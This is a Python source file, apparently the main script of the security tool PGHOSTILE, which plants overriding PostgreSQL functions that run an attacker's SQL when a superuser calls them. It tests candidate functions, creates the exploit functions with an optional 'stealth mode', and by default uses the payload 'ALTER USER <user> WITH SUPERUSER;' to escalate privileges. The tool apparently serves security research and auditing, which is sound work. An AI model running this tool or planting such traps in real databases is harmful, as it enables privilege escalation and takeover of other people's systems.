# Copyright (c) 2022 Aiven, Helsinki, Finland. https://aiven.io

import sys
import os
import argparse
import getpass
from psycopg2 import Error
from core.utils import print_ok, print_err, print_warn, convert_types, get_candidate_functions
from core.database import Database

from core.dbfunction_override import DBFunctionOverride


def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests, out_dir, track_execution, overwrite_existing):
    override_functions = []
    exploitables = []
    errors = []
    test_log = []

    print_ok("Starting ... \n")
    c_functions = get_candidate_functions(db)
    print("[ * ] %s interesting functions have been identified" % len(c_functions))
    for df in c_functions:
        conv_types = convert_types(df.params_type)
        for artype in conv_types:
            dff = DBFunctionOverride(df, artype, exploit_payload, stealth_mode, track_execution)
            if dff not in override_functions:
                override_functions.append(dff)
    if not overwrite_existing:
        print("[ * ] Checking if functions already exist")
        for df in override_functions:
            if df.exists():
                print_err(f"Test function {dff} is already defined! Stopping")
                return

    if run_tests:
        print("[ * ] Testing functions")
        for df in override_functions:
            try:
                if df.run_test():
                    exploitables.append(df)
            except Exception as e:
                test_log.append(f"Exception testing function {df} {e}")
                pass
        with open(os.path.join(out_dir, "exploitables.sql"), "w") as f:
            f.write(";\n".join([f.test_query for f in exploitables]))
        if len(exploitables) > 0:
            print("[ * ] %s exploitable function calls have been tested" % len(exploitables))
        else:
            print_err("No exploitable functions found during test")
            return

    if create_exploit:
        print("[ * ] Creating exploit functions")
        created_functions = []
        if run_tests:
            for df in exploitables:
                df.create_exploit_function()
                created_functions.append(df)
        else:
            for df in override_functions:
                try:
                    df.create_exploit_function()
                    created_functions.append(df)
                except Exception as e:
                    errors.append(f"Exception creating exploit function {df} {e}")

        print("[ * ] Done!")
        with open(os.path.join(out_dir, "drop_functions.sql"), "w") as f:
            f.write(";\n".join([f.drop_query for f in created_functions]))

    print_ok("\n%d functions have been created" % len(created_functions))

    if len(errors) > 0:
        print_warn("There were some errors creating functions. See errors.txt for details")
    with open(os.path.join(out_dir, "errors.txt"), "w") as f:
        f.write("\n".join(errors))

    with open(os.path.join(out_dir, "test_log.txt"), "w") as f:
        f.write("\n".join(test_log))

    print_ok(f"The '{out_dir}' folder contains the output")


def main():
    parser = argparse.ArgumentParser(description='PGHOSTILE. Make PostgreSQL an hostile environment for superusers')
    parser.add_argument('db_username', metavar='db_username', type=str, help='Database username')
    parser.add_argument('db_name', metavar='db_name', type=str, help='Database name')
    parser.add_argument("-X", "--disable-exploits-creation", default=False, action='store_true', help='Do not create exploit functions')
    parser.add_argument("-H", '--db-host', default="127.0.0.1", type=str, help='Database host (default 127.0.0.1)')
    parser.add_argument("-p", '--db-port', default=5432, type=int, help='Database port')
    parser.add_argument("-P", "--ask-pass", action='store_true', help='Prompt for database passsword')
    parser.add_argument("-o", '--out', default="./out", type=str, help='Output dir (deafult ./out)')
    parser.add_argument("-T", "--skip-tests", default=False, action='store_true', help='Disable test')
    parser.add_argument("-s", "--disable-stealth-mode", default=False, action='store_true', help='Disable stealth mode')
    parser.add_argument("-S", '--db-ssl-mode', type=str, help='Database ssl mode (default None)')
    parser.add_argument("-x", '--exploit-payload', type=str, help='The SQL commands')
    parser.add_argument("-t", "--track-execution", default=False, action='store_true', help='Track the exploit function execution')
    parser.add_argument("-O", "--no-overwrite", default=False, action='store_true', help='Stop execution if at least one exploit function already exists')
    args = parser.parse_args()

    if not os.path.isdir(args.out):
        print_err(f"Error: {args.out} is not a folder")
        return 1

    db_pass = os.environ.get("PGPASSWORD", None)
    if not db_pass or args.ask_pass:
        db_pass = getpass.getpass(prompt="Enter DB password:")

    # if args.skip_tests and args.disable_exploits_creation:
    #     print_err("Error: using both -X and -T won't produce any output... exiting")
    #     return 2

    try:
        db = Database(
            username=args.db_username,
            password=db_pass,
            database=args.db_name,
            host=args.db_host,
            port=args.db_port,
            sslmode=args.db_ssl_mode
        )
    except Error as error:
        print_err(f"Error while connecting to PostgreSQL: {error}")
        return 2

    if args.track_execution:
        try:
            db.query("create schema if not exists pghostile")
            db.query("""
                create table if not exists pghostile.triggers (
                    id SERIAL primary key,
                    fname varchar(255),
                    params text,
                    current_query text,
                    created_at timestamp without time zone default (pg_catalog.now() at time zone 'utc')
                );
            """)
        except Error as error:
            print_err(f"Error creating tracking table: {error}")
            return 3

    exploit_payload = args.exploit_payload or f"ALTER USER {args.db_username} WITH SUPERUSER;"

    try:
        make_it_hostile(
            db,
            exploit_payload,
            stealth_mode=not args.disable_stealth_mode,
            create_exploit=not args.disable_exploits_creation,
            run_tests=not args.skip_tests,
            out_dir=args.out,
            track_execution=args.track_execution,
            overwrite_existing=not args.no_overwrite
        )
    except KeyboardInterrupt:
        print("Exit requested by the user")
    except Error as dberr:
        print_err("Database error %s" % dberr)
    except Exception:
        print_err("Unhandled exception")
        raise
    finally:
        db.close()
        # print("Exiting")

    return 0


if __name__ == "__main__":
    sys.exit(main())
